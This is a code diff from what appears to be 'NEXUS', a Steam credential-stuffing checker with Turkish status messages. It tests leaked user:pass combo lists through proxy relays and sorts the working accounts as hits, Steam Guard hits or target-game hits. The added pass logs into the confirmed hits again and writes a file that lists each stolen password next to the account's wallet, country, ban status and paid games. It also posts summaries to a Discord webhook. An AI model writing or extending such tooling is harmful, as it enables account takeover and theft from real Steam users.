@@ -330,70 +330,225 @@ class HeadlessOrchestrator:
         print("\033[1;32m═══════════════════════════════════════════════════════════════════\033[0m\n")
 
         # ─── Discord Cycle Completion Notification ───────────────────────────
-        # Send a summary embed to Discord when all accounts in the file are done
-        if self.dispatcher:
-            _dispatcher_temp = DiscordWebhookDispatcher(self.webhook_url)
+        _dispatcher_notify = DiscordWebhookDispatcher(self.webhook_url) if self.webhook_url else None
+        if _dispatcher_notify:
             try:
-                await _dispatcher_temp.start()
-                await _dispatcher_temp.dispatch_system_message(
-                    title="✅ NEXUS — TÜM HESAPLAR KONTROL EDİLDİ",
+                await _dispatcher_notify.start()
+                await _dispatcher_notify.dispatch_system_message(
+                    title="NEXUS — TUM HESAPLAR TAMAMLANDI",
                     description=(
-                        f"**{self.combo_path.name}** dosyasındaki tüm `{self.checked_count:,}` hesap başarıyla check edildi.\n"
-                        f"Sistem otomatik olarak **baştan** yeniden başlıyor... 🔄"
+                        f"**{self.combo_path.name}** dosyasindaki tum `{self.checked_count:,}` hesap check edildi.\n"
+                        f"Simdi sadece **HIT hesaplari** oyunlariyla birlikte yeniden dogrulaniyor..."
+                    ),
+                    color=0xFFAB00,
+                    fields=[
+                        {"name": "Target Hit", "value": f"**{self.target_hit_count:,}**", "inline": True},
+                        {"name": "Tum Paid Hit", "value": f"**{self.hit_count:,}**", "inline": True},
+                        {"name": "Steam Guard", "value": f"**{self.two_fa_count:,}**", "inline": True},
+                        {"name": "Toplam Check", "value": f"**{self.checked_count:,}**", "inline": True},
+                        {"name": "Sure", "value": f"**{elapsed_str}**", "inline": True},
+                        {"name": "Sonraki Adim", "value": "Hit Re-Dogrulama baslatiliyor...", "inline": True},
+                    ],
+                )
+                await asyncio.sleep(2.0)
+                await _dispatcher_notify.stop()
+            except Exception as _e:
+                print(f"[DISCORD] Completion notification error: {_e}")
+        # ────────────────────────────────────────────────────────────────────
+
+        # ─── Hit Re-Verification Pass ─────────────────────────────────────────
+        # Re-verify only confirmed hits (hits_combos_only.txt) with fresh Steam API
+        # to ensure accurate, real game lists — then write a final verified TXT.
+        hits_combos = self.exporter.hits_combos_file
+        if hits_combos.exists() and hits_combos.stat().st_size > 0:
+            print(f"\n\033[1;33m[HIT REVERIFY] Starting hit re-verification pass on {hits_combos.name}...\033[0m")
+            await self._reverify_hits(hits_combos)
+        else:
+            print("\n[HIT REVERIFY] No confirmed hits to re-verify.")
+        # ─────────────────────────────────────────────────────────────────────
+
+
+
+
+
+    async def _reverify_hits(self, hits_combos_file: Path):
+        """
+        Re-verifies all confirmed hit accounts from hits_combos_only.txt.
+        Makes fresh Steam API calls to get the real, live game library for each account.
+        Writes results to VERIFIED_HITS_WITH_GAMES.txt and sends Discord summary.
+        """
+        output_file = RESULTS_DIR / "VERIFIED_HITS_WITH_GAMES.txt"
+
+        # Parse the hits combos file (format: user:pass per line)
+        combos = []
+        try:
+            with open(hits_combos_file, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    if line and ":" in line:
+                        parts = line.split(":", 1)
+                        if len(parts) == 2:
+                            u, p = parts[0].strip(), parts[1].strip()
+                            if u and p:
+                                combos.append((u, p))
+        except Exception as e:
+            print(f"[HIT REVERIFY] Could not read hits file: {e}")
+            return
+
+        if not combos:
+            print("[HIT REVERIFY] No valid combos found in hits file.")
+            return
+
+        # Deduplicate
+        seen = set()
+        unique_combos = []
+        for u, p in combos:
+            key = (u.lower(), p)
+            if key not in seen:
+                seen.add(key)
+                unique_combos.append((u, p))
+        combos = unique_combos
+
+        total = len(combos)
+        print(f"\033[1;33m[HIT REVERIFY] Re-verifying {total} confirmed hit accounts with live Steam API...\033[0m")
+
+        # Use lower concurrency for re-verify (accuracy over speed)
+        reverify_concurrency = min(20, self.concurrency // 2, total)
+        semaphore = asyncio.Semaphore(max(1, reverify_concurrency))
+        verified_results = []
+        done_count = 0
+        lock = asyncio.Lock()
+
+        async def _check_one(username: str, password: str):
+            nonlocal done_count
+            async with semaphore:
+                relay = None
+                result = None
+                if self.relay_pool and self.relay_pool.total > 0:
+                    relay = await self.relay_pool.get_next_relay()
+                try:
+                    session = await self.transport_pool.get_session(relay)
+                    result = await validate_credential_tuple(
+                        session=session,
+                        username=username,
+                        password=password,
+                        relay=relay,
+                        timeout=self.timeout
+                    )
+                except Exception as e:
+                    result = {"status": "ERROR", "username": username, "password": password,
+                              "account": f"{username}:{password}", "games": [], "details": str(e)}
+                finally:
+                    if self.relay_pool and relay:
+                        self.relay_pool.release_relay(relay)
+
+                async with lock:
+                    done_count += 1
+                    if done_count % 25 == 0 or done_count == total:
+                        pct = int(done_count / total * 100)
+                        print(f"\r\033[1;33m[HIT REVERIFY] Progress: {done_count}/{total} ({pct}%)\033[0m", end="", flush=True)
+
+                status = result.get("status", "ERROR") if result else "ERROR"
+                if status in ("HIT", "2FA_HIT"):
+                    verified_results.append(result)
+
+        tasks = [_check_one(u, p) for u, p in combos]
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+        print(f"\n\033[1;32m[HIT REVERIFY] Complete. {len(verified_results)}/{total} accounts still valid.\033[0m")
+
+        # Write verified hits TXT with full game list
+        try:
+            RESULTS_DIR.mkdir(parents=True, exist_ok=True)
+            with open(output_file, "w", encoding="utf-8") as out:
+                out.write("=" * 70 + "\n")
+                out.write("  NEXUS VERIFIED HITS WITH GAMES — Re-Verification Pass\n")
+                out.write(f"  Total Re-Verified: {len(verified_results)} / {total} original hits\n")
+                out.write("=" * 70 + "\n\n")
+
+                for r in verified_results:
+                    acct = r.get("account", f"{r.get('username','')}:{r.get('password','')}")
+                    status = r.get("status", "")
+                    steamid = r.get("steamid", "N/A")
+                    persona = r.get("persona_name", "")
+                    total_games = r.get("total_games", 0)
+                    paid_games = r.get("paid_games", 0)
+                    wallet = r.get("wallet", "")
+                    country = r.get("country", "Global")
+                    vac = "VAC BANNED" if r.get("vac_banned") else "CLEAN"
+                    games = r.get("games", [])
+
+                    paid_game_names = [
+                        g.get("name", "").strip()
+                        for g in games
+                        if g.get("name") and not g.get("is_free", False) and not g.get("name", "").startswith("AppID ")
+                    ]
+                    free_game_names = [
+                        g.get("name", "").strip()
+                        for g in games
+                        if g.get("name") and g.get("is_free", False) and not g.get("name", "").startswith("AppID ")
+                    ]
+
+                    from nexus.utils.targets import evaluate_target_account
+                    is_target, matched = evaluate_target_account(r)
+                    target_tag = f"  [TARGET: {', '.join(t.get('name','') for t in matched[:5])}]" if is_target else ""
+
+                    out.write(f"Account  : {acct}\n")
+                    out.write(f"Status   : {status}{' [2FA LOCKED]' if status == '2FA_HIT' else ''}\n")
+                    if persona:
+                        out.write(f"Persona  : {persona}\n")
+                    out.write(f"SteamID  : {steamid}\n")
+                    out.write(f"Country  : {country}\n")
+                    if wallet:
+                        out.write(f"Wallet   : {wallet}\n")
+                    out.write(f"VAC      : {vac}\n")
+                    out.write(f"Games    : {total_games} total ({paid_games} paid)\n")
+                    if target_tag:
+                        out.write(f"TARGETS  :{target_tag}\n")
+                    if paid_game_names:
+                        out.write(f"PAID     : {', '.join(paid_game_names)}\n")
+                    if free_game_names:
+                        out.write(f"Free     : {', '.join(free_game_names[:10])}\n")
+                    out.write("-" * 70 + "\n")
+
+            print(f"\033[1;36m[HIT REVERIFY] Output saved: {output_file}\033[0m")
+        except Exception as e:
+            print(f"[HIT REVERIFY] Could not write output: {e}")
+
+        # Send final Discord summary
+        if self.webhook_url:
+            _final_dispatcher = DiscordWebhookDispatcher(self.webhook_url)
+            try:
+                await _final_dispatcher.start()
+                # Count how many reverified results hit target games
+                target_reverified = 0
+                for r in verified_results:
+                    from nexus.utils.targets import evaluate_target_account as _eta
+                    if _eta(r)[0]:
+                        target_reverified += 1
+
+
+                await _final_dispatcher.dispatch_system_message(
+                    title="NEXUS — HIT DOGRULAMA TAMAMLANDI",
+                    description=(
+                        f"Tum hit hesaplari yeniden dogrulandi ve oyunlar kaydedildi.\n"
+                        f"Sonuc dosyasi: `VERIFIED_HITS_WITH_GAMES.txt`"
                     ),
                     color=0x00FF88,
                     fields=[
-                        {"name": "🎯 Target Hit", "value": f"**{self.target_hit_count:,}**", "inline": True},
-                        {"name": "✅ Tüm Paid Hit", "value": f"**{self.hit_count:,}**", "inline": True},
-                        {"name": "🛡️ Steam Guard", "value": f"**{self.two_fa_count:,}**", "inline": True},
-                        {"name": "📊 Toplam Check", "value": f"**{self.checked_count:,}**", "inline": True},
-                        {"name": "⏱️ Süre", "value": f"**{elapsed_str}**", "inline": True},
-                        {"name": "🔄 Sonraki Döngü", "value": "Başlatılıyor...", "inline": True},
+                        {"name": "Toplam Hit", "value": f"**{total}**", "inline": True},
+                        {"name": "Hala Gecerli", "value": f"**{len(verified_results)}**", "inline": True},
+                        {"name": "Target Hit", "value": f"**{target_reverified}**", "inline": True},
+                        {"name": "Dosya", "value": "`VERIFIED_HITS_WITH_GAMES.txt`", "inline": False},
                     ],
-                    mention_everyone=False
                 )
-                # Give the queue a moment to actually send before closing
                 await asyncio.sleep(3.0)
-                await _dispatcher_temp.stop()
-            except Exception as _e:
-                print(f"[DISCORD] Cycle completion notification error: {_e}")
-        # ────────────────────────────────────────────────────────────────────
-
-        # ─── Auto Re-check Loop ───────────────────────────────────────────────
-        # After a full pass through all combos, automatically reset and start over
-        # from the beginning. This keeps the system running 24/7 without manual restart.
-        print("\033[93m[AUTO-CYCLE] Resetting to start of file for next pass in 10 seconds...\033[0m")
-        await asyncio.sleep(10)
-
-        # Hard-reset all counters and state for fresh pass
-        self.skip_to_index = 0
-        self.max_processed_index = 0
-        self.checked_count = 0
-        self.hit_count = 0
-        self.target_hit_count = 0
-        self.two_fa_count = 0
-        self.invalid_count = 0
-        self.error_count = 0
-        self.resume = False  # Start fresh — don't resume from old checkpoint
-        # Clear checkpoint so new pass starts from 0
-        try:
-            import json as _json
-            _cp = {"checked": 0, "total": 0, "target_hits": 0, "hits": 0, "two_fa": 0, "timestamp": time.time(), "cycle_restart": True}
-            CHECKPOINT_FILE.write_text(_json.dumps(_cp, indent=2), encoding="utf-8")
-        except Exception:
-            pass
-
-        self._is_running = True
-        self._watchdog_stop_event = asyncio.Event()
-        self.transport_pool = SessionTransportPool(pool_limit=max(150, self.concurrency * 2))
-        self.dispatcher = DiscordWebhookDispatcher(self.webhook_url) if self.webhook_url else None
-        print("\033[92m[AUTO-CYCLE] Launching next verification pass...\033[0m")
-        await self.run()
-        # ────────────────────────────────────────────────────────────────────
-
-
+                await _final_dispatcher.stop()
+            except Exception as e:
+                print(f"[HIT REVERIFY] Discord final notification error: {e}")
 
     async def _worker(self, queue: asyncio.Queue, semaphore: asyncio.Semaphore):
+
         """Worker task executing individual account authentication handshakes with persistent connection pooling."""
         while self._is_running:
             try:
